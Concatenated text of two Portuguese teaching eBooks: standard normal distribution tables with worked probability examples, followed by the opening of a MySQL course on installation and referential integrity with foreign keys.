0,000085
0,000088
0,000092
0,000096
0,000100
0,000104
-3,70
0,000108
0,000112
0,000117
0,000121
0,000126
0,000131
0,000136
0,000142
0,000147
0,000153
-3,60
0,000159
0,000165
0,000172
0,000178
0,000185
0,000193
0,000200
0,000208
0,000216
0,000224
-3,50
0,000233
0,000242
0,000251
0,000260
0,000270
0,000280
0,000291
0,000302
0,000313
0,000325
-3,40
0,000337
0,000349
0,000362
0,000376
0,000390
0,000404
0,000419
0,000434
0,000450
0,000466
-3,30
0,000483
0,000501
0,000519
0,000538
0,000557
0,000577
0,000598
0,000619
0,000641
0,000664
-3,20
0,000687
0,000711
0,000736
0,000762
0,000789
0,000816
0,000845
0,000874
0,000904
0,000935
-3,10
0,000968
0,001001
0,001035
0,001070
0,001107
0,001144
0,001183
0,001223
0,001264
0,001306
-3,00
0,001350
0,001395
0,001441
0,001489
0,001538
0,001589
0,001641
0,001695
0,001750
0,001807
CURVA NORMAL PADRONIZADA (ÁREAS ACUMULADAS)
(-5,00 ≤ z  ≤ -3,00)
 
z
A

 
 
 
   
 
 
 
Z
0,00
0,01
0,02
0,03
0,04
0,05
0,06
0,07
0,08
0,09
-3,00
0,001350
0,001395
0,001441
0,001489
0,001538
0,001589
0,001641
0,001695
0,001750
0,001807
-2,90
0,001866
0,001926
0,001988
0,002052
0,002118
0,002186
0,002256
0,002327
0,002401
0,002477
-2,80
0,002555
0,002635
0,002718
0,002803
0,002890
0,002980
0,003072
0,003167
0,003264
0,003364
-2,70
0,003467
0,003573
0,003681
0,003793
0,003907
0,004025
0,004145
0,004269
0,004396
0,004527
-2,60
0,004661
0,004799
0,004940
0,005085
0,005234
0,005386
0,005543
0,005703
0,005868
0,006037
-2,50
0,006210
0,006387
0,006569
0,006756
0,006947
0,007143
0,007344
0,007549
0,007760
0,007976
-2,40
0,008198
0,008424
0,008656
0,008894
0,009137
0,009387
0,009642
0,009903
0,010170
0,010444
-2,30
0,010724
0,011011
0,011304
0,011604
0,011911
0,012224
0,012545
0,012874
0,013209
0,013553
-2,20
0,013903
0,014262
0,014629
0,015003
0,015386
0,015778
0,016177
0,016586
0,017003
0,017429
-2,10
0,017864
0,018309
0,018763
0,019226
0,019699
0,020182
0,020675
0,021178
0,021692
0,022216
-2,00
0,022750
0,023295
0,023852
0,024419
0,024998
0,025588
0,026190
0,026803
0,027429
0,028067
-1,90
0,028717
0,029379
0,030054
0,030742
0,031443
0,032157
0,032884
0,033625
0,034380
0,035148
-1,80
0,035930
0,036727
0,037538
0,038364
0,039204
0,040059
0,040930
0,041815
0,042716
0,043633
-1,70
0,044565
0,045514
0,046479
0,047460
0,048457
0,049471
0,050503
0,051551
0,052616
0,053699
-1,60
0,054799
0,055917
0,057053
0,058208
0,059380
0,060571
0,061780
0,063008
0,064255
0,065522
-1,50
0,066807
0,068112
0,069437
0,070781
0,072145
0,073529
0,074934
0,076359
0,077804
0,079270
-1,40
0,080757
0,082264
0,083793
0,085343
0,086915
0,088508
0,090123
0,091759
0,093418
0,095098
-1,30
0,096800
0,098525
0,100273
0,102042
0,103835
0,105650
0,107488
0,109349
0,111232
0,113139
-1,20
0,115070
0,117023
0,119000
0,121000
0,123024
0,125072
0,127143
0,129238
0,131357
0,133500
-1,10
0,135666
0,137857
0,140071
0,142310
0,144572
0,146859
0,149170
0,151505
0,153864
0,156248
-1,00
0,158655
0,161087
0,163543
0,166023
0,168528
0,171056
0,173609
0,176186
0,178786
0,181411
CURVA NORMAL PADRONIZADA (ÁREAS ACUMULADAS)
(-3,00 ≤ z  ≤ -1,00)
Z
0,00
0,01
0,02
0,03
0,04
0,05
0,06
0,07
0,08
0,09
-1,00
0,158655
0,161087
0,163543
0,166023
0,168528
0,171056
0,173609
0,176186
0,178786
0,181411
-0,90
0,184060
0,186733
0,189430
0,192150
0,194895
0,197663
0,200454
0,203269
0,206108
0,208970
-0,80
0,211855
0,214764
0,217695
0,220650
0,223627
0,226627
0,229650
0,232695
0,235762
0,238852
-0,70
0,241964
0,245097
0,248252
0,251429
0,254627
0,257846
0,261086
0,264347
0,267629
0,270931
-0,60
0,274253
0,277595
0,280957
0,284339
0,287740
0,291160
0,294599
0,298056
0,301532
0,305026
-0,50
0,308538
0,312067
0,315614
0,319178
0,322758
0,326355
0,329969
0,333598
0,337243
0,340903
-0,40
0,344578
0,348268
0,351973
0,355691
0,359424
0,363169
0,366928
0,370700
0,374484
0,378280
-0,30
0,382089
0,385908
0,389739
0,393580
0,397432
0,401294
0,405165
0,409046
0,412936
0,416834
-0,20
0,420740
0,424655
0,428576
0,432505
0,436441
0,440382
0,444330
0,448283
0,452242
0,456205
-0,10
0,460172
0,464144
0,468119
0,472097
0,476078
0,480061
0,484047
0,488034
0,492022
0,496011
0,00
0,500000
0,503989
0,507978
0,511966
0,515953
0,519939
0,523922
0,527903
0,531881
0,535856
0,10
0,539828
0,543795
0,547758
0,551717
0,555670
0,559618
0,563559
0,567495
0,571424
0,575345
0,20
0,579260
0,583166
0,587064
0,590954
0,594835
0,598706
0,602568
0,606420
0,610261
0,614092
0,30
0,617911
0,621720
0,625516
0,629300
0,633072
0,636831
0,640576
0,644309
0,648027
0,651732
0,40
0,655422
0,659097
0,662757
0,666402
0,670031
0,673645
0,677242
0,680822
0,684386
0,687933
0,50
0,691462
0,694974
0,698468
0,701944
0,705401
0,708840
0,712260
0,715661
0,719043
0,722405
0,60
0,725747
0,729069
0,732371
0,735653
0,738914
0,742154
0,745373
0,748571
0,751748
0,754903
0,70
0,758036
0,761148
0,764238
0,767305
0,770350
0,773373
0,776373
0,779350
0,782305
0,785236
0,80
0,788145
0,791030
0,793892
0,796731
0,799546
0,802337
0,805105
0,807850
0,810570
0,813267
0,90
0,815940
0,818589
0,821214
0,823814
0,826391
0,828944
0,831472
0,833977
0,836457
0,838913
1,00
0,841345
0,843752
0,846136
0,848495
0,850830
0,853141
0,855428
0,857690
0,859929
0,862143
CURVA NORMAL PADRONIZADA (ÁREAS ACUMULADAS)
(-1,00 ≤ z  ≤ 1,00)

 
 
 
 
 
 
 
Z
0,00
0,01
0,02
0,03
0,04
0,05
0,06
0,07
0,08
0,09
1,00
0,841345
0,843752
0,846136
0,848495
0,850830
0,853141
0,855428
0,857690
0,859929
0,862143
1,10
0,864334
0,866500
0,868643
0,870762
0,872857
0,874928
0,876976
0,879000
0,881000
0,882977
1,20
0,884930
0,886861
0,888768
0,890651
0,892512
0,894350
0,896165
0,897958
0,899727
0,901475
1,30
0,903200
0,904902
0,906582
0,908241
0,909877
0,911492
0,913085
0,914657
0,916207
0,917736
1,40
0,919243
0,920730
0,922196
0,923641
0,925066
0,926471
0,927855
0,929219
0,930563
0,931888
1,50
0,933193
0,934478
0,935745
0,936992
0,938220
0,939429
0,940620
0,941792
0,942947
0,944083
1,60
0,945201
0,946301
0,947384
0,948449
0,949497
0,950529
0,951543
0,952540
0,953521
0,954486
1,70
0,955435
0,956367
0,957284
0,958185
0,959070
0,959941
0,960796
0,961636
0,962462
0,963273
1,80
0,964070
0,964852
0,965620
0,966375
0,967116
0,967843
0,968557
0,969258
0,969946
0,970621
1,90
0,971283
0,971933
0,972571
0,973197
0,973810
0,974412
0,975002
0,975581
0,976148
0,976705
2,00
0,977250
0,977784
0,978308
0,978822
0,979325
0,979818
0,980301
0,980774
0,981237
0,981691
2,10
0,982136
0,982571
0,982997
0,983414
0,983823
0,984222
0,984614
0,984997
0,985371
0,985738
2,20
0,986097
0,986447
0,986791
0,987126
0,987455
0,987776
0,988089
0,988396
0,988696
0,988989
2,30
0,989276
0,989556
0,989830
0,990097
0,990358
0,990613
0,990863
0,991106
0,991344
0,991576
2,40
0,991802
0,992024
0,992240
0,992451
0,992656
0,992857
0,993053
0,993244
0,993431
0,993613
2,50
0,993790
0,993963
0,994132
0,994297
0,994457
0,994614
0,994766
0,994915
0,995060
0,995201
2,60
0,995339
0,995473
0,995604
0,995731
0,995855
0,995975
0,996093
0,996207
0,996319
0,996427
2,70
0,996533
0,996636
0,996736
0,996833
0,996928
0,997020
0,997110
0,997197
0,997282
0,997365
2,80
0,997445
0,997523
0,997599
0,997673
0,997744
0,997814
0,997882
0,997948
0,998012
0,998074
2,90
0,998134
0,998193
0,998250
0,998305
0,998359
0,998411
0,998462
0,998511
0,998559
0,998605
3,00
0,998650
0,998694
0,998736
0,998777
0,998817
0,998856
0,998893
0,998930
0,998965
0,998999
CURVA NORMAL PADRONIZADA (ÁREAS ACUMULADAS)
(1,00 ≤ z  ≤ 3,00)
Z
0,00
0,01
0,02
0,03
0,04
0,05
0,06
0,07
0,08
0,09
3,00
0,998650
0,998694
0,998736
0,998777
0,998817
0,998856
0,998893
0,998930
0,998965
0,998999
3,10
0,999032
0,999065
0,999096
0,999126
0,999155
0,999184
0,999211
0,999238
0,999264
0,999289
3,20
0,999313
0,999336
0,999359
0,999381
0,999402
0,999423
0,999443
0,999462
0,999481
0,999499
3,30
0,999517
0,999534
0,999550
0,999566
0,999581
0,999596
0,999610
0,999624
0,999638
0,999651
3,40
0,999663
0,999675
0,999687
0,999698
0,999709
0,999720
0,999730
0,999740
0,999749
0,999758
3,50
0,999767
0,999776
0,999784
0,999792
0,999800
0,999807
0,999815
0,999822
0,999828
0,999835
3,60
0,999841
0,999847
0,999853
0,999858
0,999864
0,999869
0,999874
0,999879
0,999883
0,999888
3,70
0,999892
0,999896
0,999900
0,999904
0,999908
0,999912
0,999915
0,999918
0,999922
0,999925
3,80
0,999928
0,999931
0,999933
0,999936
0,999938
0,999941
0,999943
0,999946
0,999948
0,999950
3,90
0,999952
0,999954
0,999956
0,999958
0,999959
0,999961
0,999963
0,999964
0,999966
0,999967
4,00
0,999968
0,999970
0,999971
0,999972
0,999973
0,999974
0,999975
0,999976
0,999977
0,999978
4,10
0,999979
0,999980
0,999981
0,999982
0,999983
0,999983
0,999984
0,999985
0,999985
0,999986
4,20
0,999987
0,999987
0,999988
0,999988
0,999989
0,999989
0,999990
0,999990
0,999991
0,999991
4,30
0,999991
0,999992
0,999992
0,999993
0,999993
0,999993
0,999993
0,999994
0,999994
0,999994
4,40
0,999995
0,999995
0,999995
0,999995
0,999996
0,999996
0,999996
0,999996
0,999996
0,999996
4,50
0,999997
0,999997
0,999997
0,999997
0,999997
0,999997
0,999997
0,999998
0,999998
0,999998
4,60
0,999998
0,999998
0,999998
0,999998
0,999998
0,999998
0,999998
0,999998
0,999999
0,999999
4,70
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
4,80
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
0,999999
4,90
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
5,00
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
1,000000
CURVA NORMAL PADRONIZADA (ÁREAS ACUMULADAS)
(3,00 ≤ z  ≤ 5,00)

 
 
 
 
CURVA NORMAL PADRÃO E PROBABILIDADES  
 
 
A probabilidade de que uma variável aleatória x caia dentro 
de um intervalo de abscissas da curva Normal Padrão é 
dada pela área A delimitada por este intervalo sob a curva. 
 
A curva normal padrão faz uma transformação de forma 
que o valor do escore calculado z abrange a mesma área 
que aquela delimitada por x na curva Normal específica. 
 
O cálculo de probabilidades, para um dado intervalo,  pode 
ser feito tanto através da curva Normal específica (com   
e   considerados) quanto na curva normal padronizada (com  =0 e   =1), desde que 
esse intervalo seja obtido a partir dos escores correspondentes. Assim, seguem alguns 
exemplos de cálculo de probabilidades de algumas faixas: 
 
 
a) P(z < -3,12) @ 0,001035 = 
0,1035% (Tab: 3,12 → 
v:3,00+h:0,12). Neste caso 
a 
área 
tabelada 
corresponde 
à 
área 
procurada, 
que 
é 
delimitada 
pela 
curva 
normal e pela abscissa -
3,12. 
 
 
 
b) P(z > 2,55) @ 1–P(z < 2,55) @ 1–0,994614 = 0,005386 @ 0,54% (Tab: 
2,55→v:2,00+h:0,55) 
 
µ
x
fdp - curva específica
µ-1s
µ+1s
µ-2s
µ-3s
µ+2s
µ+3s
0
-3
-2
-1
1
2
3
fdp - curva normal padrão
A
A
z
 
 
0
-3
-2
-1
1
2
3
z
2,55
Área Tabelada e Procurada

 
 
 
No caso, a área desejada é aquela que corresponde 
à abscissa maior que 2,55, porém a área tabelada é 
aquela correspondente à abscissa menor que 2,55. 
Como a área total sob a curva é igual a unidade, a 
área desejada é obtida fazendo-se a diferença “1–
P(z < 2,55)”. 
 
 
 
 
c) P(-1,82 < z < 0,37) = P(z < 0,37) – P(z < -1,82) @ 0,644309–0,037538 = 0,606771 @ 
60,68% 
(Tab: 0,37→v:0,30+h:0,07 e  1,82→v:1,00+h:0,82) 
 
No caso, deve ser obtida a probabilidade “P(z<0,37)” 
diretamente da tabela, o que também deve ser feito 
para  “P(z<-1,82)”. A área desejada, correspondente 
ao intervalo deve ser obtida fazendo-se a primeira 
área menos a segunda. 
 
 
 
d) P(z > 1,36) = 1–P(z < 1,36) @ 1–0,913085 = 0,086915 @ 8,69% (Tab: 
1,36→v:1,00+h:0,36) 
 
 
A probabilidade obtida diretamente da tabela é “P(z 
< 1,36)”. Como a área total sob a curva é igual a 
unidade, a área desejada é obtida fazendo-se “1–P(z 
< 1,36)”. 
 
 
0
-3
-2
-1
1
2
3
z
2,55
Área Tabelada
Área Procurada
 
 
0
-3
-2
-1
1
2
3
z
Área Tabelada
Área Procurada
-1,82
0,37
 
 
0
-3
-2
-1
1
2
3
z
Área Tabelada
Área Procurada
1,36

 
 
 
 
 
 
OBS.: Todas as áreas indicadas na tabela correspondem a um valor de abscissa menor 
ou igual ao escore “z”. 
 
Para a utilização da distribuição normalizada, é requerido a determinação dos escores 
correspondentes aos limites de intervalos. Assim:  
e) Para 𝜇= 80 𝑒 𝜎= 12, determinar 𝑃(𝑥 <  75). 
R.: Escore para 𝑥= 75:  
 
Logo P(x < 75) = P(z < -0,42) @ 0,351973 @ 35,20% 
 
f) Para 𝜇= 0,46 𝑒 𝜎= 0,07, determinar 𝑃(𝑥 <  0,51).. 
R.: Escore para x=0,51: 
 
Logo P(x < 0,51) = P(z < 0,71) @ 0,761148 @ 76,11% 
 
g) Para 𝜇= 112 𝑒 𝜎= 21., determinar P(x > 126). 
R.: Escore para x=126: 
 
Logo P(x > 126) = P(z > 0,67) = 1-P(z < 0,67) = 1- 0,748571 = 0,251429 @ 25,14% 
 
h) Para 𝜇= 88 𝑒 𝜎= 16, determinar P(90 < x < 97). 
R.:  
Escore para x=90: 
 
Escore para x=97: 
 
Logo P(90<x<97) = P(0,13<z<0,56) = P(z<0,56)–P(z<0,13) = 0,712260-0,551717 = 
0,160543 @ 16,05% 
 
 
 
(
)
(
)
42
,0
4167
,0
12
/
80
75
/
-
®
-
@
-
=
-
=
s
µ
x
z
71
,0
714286
,0
07
,0
/)
46
,0
51
,0
(
)
(
®
@
-
=
-
=
s
µ
x
z
67
,0
...
66666
,0
21
/)
112
126
(
)
(
®
@
-
=
-
=
s
µ
x
z
13
,0
125
,0
16
/)
88
90
(
)
(
®
=
-
=
-
=
s
µ
x
z
56
,0
5625
,0
16
/)
88
97
(
)
(
®
=
-
=
-
=
s
µ
x
z

 
 
OBTENDO ESCORES A PARTIR DA ESPECIFICAÇÕES DE ÁREAS 
 
A transformação de um escore  em um valor de variável aleatória é feito através de: 
 
Logo: 
 
Assim: 𝑥= 𝜇+ 𝜎𝑧 
 
Ex.: Para uma média de 68 unidades e um desvio padrão de 9 unidades, determine o 
valor da variável aleatória (x) que corresponderá a uma probabilidade de 96%.  
R.: 
 
P = A = 0,96 
 
Tabela: z1 = 1,75 ® A1 = 0,959941 
Tabela: z2 = 1,76 ® A2 = 0,960796 
 
Processo1: Interpolando o valor de A: 
 
 
 
Processo2: Média: 
 
 
No caso, o valor adotado foi aquele resultante do processo de interpolação: z = 1,751. 
 
Assim: 
 
 
Seguem alguns exemplos de aplicação da curva normal padronizada no cálculo de 
problemas. 
 
s
µ
-
=
-
-
=
x
padrao
desvio
media
valor
z
x
z
x
z
x
z
=
+
®
-
=
®
-
=
µ
s
µ
s
s
µ
.
.
751
,1
...
750690
,1
959941
,0
960796
,0
959941
,0
96
,0
75
,1
76
,1
75
,1
@
=
®
-
-
=
-
-
z
z
755
,1
2
/)
76
,1
75
,1(
=
+
@
z
759
,
83
9.
751
,1
68
.
=
+
=
+
=
s
µ
z
x
0,959941 
0,96 
0,960796 
1,75 
z 
1,76 
 

 
 
Ex.: Uma pesquisa sobre peso de sacas de soja revela que um lote inspecionado possui 
um peso médio de 51,1 kg com um desvio padrão de 3,8 kg, segundo uma distribuição 
normal. Escolhendo-se uma saca ao acaso, determine as probabilidades (com o auxílio 
da curva Normal Padrão) dessa amostra:  
a) ter um peso inferior a 42 kg;  
b) ter um peso entre 47,5 e 49,5 kg;  
c)  possuir peso entre 50,2 e 54,7 kg;  
d) pesar entre 55,1 e 57,8;  
e) possuir peso superior a 62 kg.  
A partir dos dados fornecidos, determine ainda o peso que corresponde a probabilidade 
de ocorrência de:   
f) 8,4%;   
g) 27,6%;   
R.: 
Dados:𝜇= 51,1𝑘𝑔 𝑒 𝜎= 3,8𝑘𝑔. 
 
a) P(x<42): 
z = (𝑥−𝜇)/𝜎 = (42-51,1)/3,8 = -2,394736... @ -2,39 Þ P(z<-2,39) = 0,013553 
\P(x<42) @ 1,36% 
 
b) 𝑃(47,5 < 𝑥< 49,5): 
𝑧!  = 𝑥! −𝜇
𝜎
 = (47,5 −51,1)/3,8 = −0,947368. . . @ −0,95 Þ 𝑃(𝑧< −0,95) 
=  0,197663 
𝑧"  = 𝑥" −𝜇
𝜎
= (49,5 −51,1)/3,8 = −0,421052. . . @ −0,42 Þ 𝑃(𝑧< −0,42) 
=  0,351973 
\ 𝑃(47,5 < 𝑥< 49,5) =  𝑃(−0,95 < 𝑧< −0,42) =  𝑃(𝑧< −0,42) −𝑃(𝑧< −0,95) 
=  0,351973 −0,197663 =  0,154310 @ 15,43% 
 
c) 𝑃(50,2 < 𝑥< 54,7): 
𝑧1 = (𝑥! −𝜇)/𝜎 = (50,2 −51,1)/3,8 = −0,236842. . . @ −0,24 Þ𝑃(𝑧< −0,24) 
=  0,466441 

 
 
𝑧"  = (𝑥" −𝜇)/𝜎= (54,7 −51,1)/3,8 =  0,947368. . . @ 0,95 Þ𝑇𝐶𝑁𝑃Þ 𝑃(𝑧< 0,95) 
=  0,828944 
\ 𝑃(50,2 < 𝑥< 54,7) =  𝑃(−0,24 < 𝑧< 0,95) =  𝑃(𝑧< 0,95) −𝑃(𝑧< −0,24) 
=  0,828944 −0,466441 =  0,362503 @ 36,25% 
 
d) 𝑃(55,1 < 𝑥< 57,8): 
𝑧!  = (𝑥! −𝜇)/𝜎 = (55,1 −51,1)/3,8 =  1,052631. . . @ 1,05 Þ𝑇𝐶𝑁𝑃Þ 𝑃(𝑧< 1,05) 
=  0,853141 
𝑧" = (𝑥" −𝜇)/𝜎= (57,8 −51,1)/3,8 =  1,763157. . . @ 1,76 Þ𝑇𝐶𝑁𝑃Þ 𝑃(𝑧< 1,76) 
=  0,960796 
\ 𝑃(55,1 < 𝑥< 57,8) =  𝑃(1,05 < 𝑧< 1,76) =  𝑃(𝑧< 1,76) −𝑃(𝑧< 1,05) 
=  0,960796 −0,853141 =  0,107655 @ 10,77% 
 
e) 𝑃(𝑥> 62,0) =  1 −𝑃(𝑥< 62,0): 
𝑧 = (𝑥−𝜇)/𝜎 = (62,0 −51,1)/3,8 =  2,868421. . . @ 2,87 Þ 𝑃(𝑧< 2,87) =  0,997948 
\ 𝑃(𝑥> 62,0) =  1 −𝑃(𝑥< 62,0) =  1 −𝑃(𝑧< 2,87) =  1 −0,997948 
=  0,002052 @ 0,21% 
 
f) x p/ P=8,4%=0,084: 
0,084:  0,083793 → z=-1,42;  0,085343 → z=-1,43 
 
𝑥 =  𝜇+ 𝑧. 𝜎 =  51,1 −1,42 ∗3,8 
=  45,704 @ 45,70 𝑘𝑔 
 
g) x p/ P=27,6%=0,276: 
0,276:  0,274253 → z=-0,60;  0,277595 → z=-0,61 
 
𝑥 =  𝜇+ 𝑧. 𝜎 =  51,1 −0,61 ∗3,8 
=  48,782 @ 48,78 𝑘𝑔 
 
 
42
,1
...
4213
,1
083793
,0
085343
,0
083793
,0
084
,0
)
42
,1
(
43
,1
)
42
,1
(
-
@
-
=
®
-
-
=
-
-
-
-
-
z
z
61
,0
...
6052
,0
274253
,0
277595
,0
274253
,0
276
,0
)
60
,0
(
61
,0
)
60
,0
(
-
@
-
=
®
-
-
=
-
-
-
-
-
z
z
0,083793 
0,084 
0,085343 
-1,42 
z 
-1,43 
 
0,274253 
0,276 
0,277595 
-0,60 
z 
-0,61 
 

 
 
Referências Bibliográficas:   
COSTA, Giovani Glaucio de Oliveira. Curso de estatística básica. 2. ed. São Paulo: 
Atlas, 2015.  
MOORE, David S. A estatística básica e sua prática. 7. ed. Rio de Janeiro: LTC, 
2017.  
TRIOLA, Mario F. Introdução à estatística. 12. ed. Rio de Janeiro. LTC, 2017.  
ARA, Amilton Braio. Introdução a estatística. São Paulo: Blucher, 2003. 
DIETZ, Thomas; KALOF, Linda. Introdução a estatística social. Rio de Janeiro: LTC, 
2014.  
MARTINS, Gilberto de A.; DONAIRE, Denis. 4. ed. Princípios de Estatística. São 
Paulo: Atlas, 2012.  
MOORE, David S; BALDI, Brigitte. A prática da estatística nas ciências da vida. 2. 
ed. Rio de Janeiro: LTC, 2014.  
SPIEGEL, M. R; STEPHENS, Larry J. Estatística: coleção schaum. 4. ed. São Paulo: 
Bookman, 2009. 
 


--- Fim do arquivo: eBook - Probabilidade e Estatística.pdf ---

--- Começo do arquivo: eBook - Banco de dados 2.pdf ---

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
 
OBJETIVOS ESPECÍFICOS 
 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Instalação e Configuração do MySQL, Criação do banco de dados 
com integridade referencial. 
Unidade 2: SQL básico 
Unidade 3: SQL intermediário 
Unidade 4: Stored Procedures e Functions 
Unidade 5: Indexação e Otimização 
 
 
 

 
 
UNIDADE 1 FUNDAMENTOS DA CIÊNCIA DE DADOS 
 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: 
• Compreender os conceitos de integridade referencial e sua importância 
no contexto de bancos de dados. 
• Dominar os comandos DDL (Data Definition Language), como CREATE, 
ALTER e DROP, para manipulação de estruturas de banco de dados. 
• Capacitar-se na criação de um banco de dados completo a partir de um 
modelo utilizando SQL. 
 
 
 

 
 
1.1 • Requisitos de hardware e software e Processo de instalação. 
 
O MySQL é um dos sistemas de gerenciamento de 
banco de dados relacionais mais populares e 
amplamente utilizados no mundo, conhecido por sua 
confiabilidade, escalabilidade e facilidade de uso. A 
versão mais recente, MySQL 8, traz várias melhorias 
e recursos avançados para atender às crescentes 
demandas de aplicativos modernos. 
Requisitos de Hardware: 
Antes de iniciar a instalação do MySQL 8, é 
importante garantir que o sistema atenda aos 
requisitos mínimos de hardware para garantir um desempenho adequado. 
Embora os requisitos específicos possam variar de acordo com o tamanho e a 
complexidade do ambiente de banco de dados, aqui estão os requisitos gerais: 
• Processador: Recomenda-se um processador de 64 bits com múltiplos 
núcleos para melhor desempenho. 
• Memória RAM: Recomenda-se pelo menos 2 GB de RAM, mas o ideal é 
ter mais para ambientes mais exigentes. 
• Espaço em disco: O espaço em disco necessário dependerá do tamanho 
dos dados e do número de usuários. Recomenda-se ter pelo menos 1 GB 
de espaço disponível. 
• Sistema Operacional: O MySQL 8 é compatível com uma variedade de 
sistemas operacionais, incluindo Windows, Linux e macOS. Certifique-se 
de verificar os requisitos específicos do sistema operacional escolhido. 
Requisitos de Software: 
Além dos requisitos de hardware, é necessário garantir que o sistema atenda 
aos requisitos de software para a instalação e execução do MySQL 8: 
• Sistema Operacional: Verifique se o sistema operacional é suportado pelo 
MySQL 8 e instale as atualizações mais recentes. 
• Dependências: Certifique-se de ter as dependências necessárias 
instaladas, como bibliotecas e ferramentas adicionais que o MySQL possa 
exigir. 
Videoaula do tópico disponível no AVA: 
Videoaula 1: Requisitos de hardware e software e Processo de instalação passo a passo. 
 
O SQL (Structured Query 
Language) ou Linguagem de 
consulta Estruturada é uma 
linguagem fundamental no 
mundo da tecnologia da 
informação, 
sendo 
amplamente utilizada para 
gerenciar e manipular dados 
em sistemas de banco de 
dados relacionais. Dominar o 
SQL pode abrir portas para 
uma 
ampla 
gama 
de 
oportunidades de carreira. 

 
 
• Java (opcional): Se você planeja usar o MySQL Workbench ou outras 
ferramentas gráficas, pode ser necessário ter o Java instalado em seu 
sistema. 
Instalação do MySQL 8: 
 
Agora que você verificou os requisitos de hardware e software, está pronto para 
instalar o MySQL 8. O processo de instalação pode variar ligeiramente 
dependendo do sistema operacional, mas geralmente envolve os seguintes 
passos: 
 
Faça o download do instalador do MySQL 8 no site oficial do MySQL. 
Execute o instalador e siga as instruções na tela para configurar o MySQL. 
Durante a instalação, você será solicitado a definir uma senha para o usuário 
root do MySQL. Certifique-se de escolher uma senha forte e segura. 
Após a conclusão da instalação, você pode começar a usar o MySQL 8 
imediatamente. 
Certifique-se de consultar a documentação oficial do MySQL para obter 
instruções detalhadas de instalação e configuração para o seu sistema 
operacional específico. 
 
Com o MySQL 8 instalado e configurado, você estará pronto para começar a 
criar e gerenciar bancos de dados para seus aplicativos e projetos. 
Aprenda Mais: Em quais Áreas Posso Trabalhar com SQL? 
 Disponível em: https://www.youtube.com/watch?v=RJkniBiJaRk 
 
 

 
 
1.2 Integridade Referencial e exemplos 
 
A integridade referencial é um conceito fundamental em bancos de dados 
relacionais, incluindo o MySQL. Neste capítulo, exploraremos o que é 
integridade referencial, sua importância e como implementá-la em um banco de 
dados MySQL.. 
 
 
 
 
 
 
 
Implementação da Integridade Referencial 
No MySQL, a integridade referencial é implementada principalmente por meio do 
uso de chaves estrangeiras (foreign keys). Uma chave estrangeira é uma coluna 
ou conjunto de colunas em uma tabela que faz referência à chave primária de 
outra tabela. Ao definir uma chave estrangeira, podemos garantir que os valores 
na coluna de referência existam na tabela referenciada. 
 
Exemplos de Integridade Referencial 
Quando colocamos uma coluna como chave estrangeira em uma tabela, 
assumimos responsabilidade com o banco de dados. 
As colunas pertencentes à chave estrangeira da tabela A devem ter o mesmo 
domínio das colunas pertencentes à chave primária da tabela B. 
O valor de uma chave estrangeira em uma tabela A deve ser de chave primária 
da tabela B, ou então ser nulo. Sintetizando, uma tabela contém uma chave 
estrangeira, então, o valor dessa chave só pode ser: 
Videoaula do tópico disponível no AVA: 
Videoaula 2: Integridade Referencial e exemplos 
 
O que é Integridade Referencial? 
Em termos simples, integridade referencial refere-se à consistência e precisão dos dados em um 
banco de dados relacionado. Isso significa que as relações entre as tabelas devem ser mantidas e 
respeitadas para garantir a integridade dos dados. 
Importância da Integridade Referencial 
A integridade referencial é crucial para garantir a precisão e consistência dos dados em um banco de 
dados. Ao impor relações entre as tabelas e garantir que todas as referências entre elas sejam 
válidas, podemos evitar inconsistências e erros nos dados. 

 
 
• Nulo – nesse caso pode, pois representa a inexistência de 
referência para uma linha da tabela. 
 Igual ao valor de alguma chave primária na tabela referenciada. 
• Você pode perguntar como ficaria uma tabela chave estrangeira 
nula. Vejamos: 
 
Na linha de Pedro Sergio Doto (NumReg:123), o valor para CdDepto está nulo, 
o que pode significar que ainda não está alocado a nenhum departamento ou foi 
deslocado de algum departamento. O que importa é que ele não tem um 
departamento assinalado, o que é uma situação válida. 
O que não pode haver é um valor de chave estrangeira que não exista como 
chave primária de nenhuma linha da tabela referenciada, no caso, a Tabela 3.20. 
Na definição de uma chave estrangeira, somente podemos nos referenciar a uma 
chave primária de uma outra tabela? Nem sempre isso é verdade. 
Na criação de uma chave estrangeira, além de podemos nos referenciar a um 
campo chave primária de outra tabela, também podemos nos referenciar a uma 
coluna que tenha sido definida como única, uma chave candidata. 
 
 
Restrições para Garantir a Integridade Referencial 
Ao trabalhar com integridade referencial em um banco de dados MySQL, é 
essencial impor restrições que garantam a consistência e a validade dos dados. 
As restrições ajudam a evitar inserções, atualizações ou exclusões que possam 
As chaves estrangeiras baseiam-se em valores (dados) e são puramente lógicas, ou seja, não existem 
apontadores físicos. 
 

 
 
violar a integridade referencial. Vamos explorar algumas das principais restrições 
utilizadas no MySQL: 
1. Chaves Estrangeiras (Foreign Keys): As chaves estrangeiras são a pedra 
angular para garantir a integridade referencial. Elas estabelecem uma 
relação entre duas tabelas, onde a chave estrangeira em uma tabela faz 
referência à chave primária em outra. No MySQL, as chaves estrangeiras 
são definidas durante a criação da tabela ou posteriormente, utilizando a 
cláusula FOREIGN KEY. 
2. Restrição ON DELETE: Esta restrição define o que acontece com os 
registros dependentes quando o registro pai (referenciado) é excluído. As 
opções mais comuns são CASCADE, que exclui automaticamente os 
registros dependentes, SET NULL, que define os valores das chaves 
estrangeiras nas linhas dependentes como NULL, e RESTRICT, que 
impede a exclusão se houver registros dependentes. 
3. Restrição ON UPDATE: Similar à restrição ON DELETE, a restrição ON 
UPDATE define o que acontece com os registros dependentes quando a 
chave primária na tabela pai é atualizada. As opções são as mesmas: 
CASCADE, SET NULL e RESTRICT. 
4. Restrição UNIQUE: Embora não seja especificamente para integridade 
referencial, as restrições UNIQUE são úteis para garantir a unicidade de 
valores em uma coluna. Elas podem ser usadas em colunas que não são 
chaves primárias para evitar a duplicação de dados. 
5. Restrição NOT NULL: Esta restrição garante que um campo não pode ter 
valores NULL, o que pode ajudar a garantir a integridade dos dados. 
 
Exemplo de Implementação: 
 

 
 
Aprenda Mais: Caves estrangeiras.  
Disponível em: https://www.youtube.com/watch?v=o-I9l30GEnw 
 
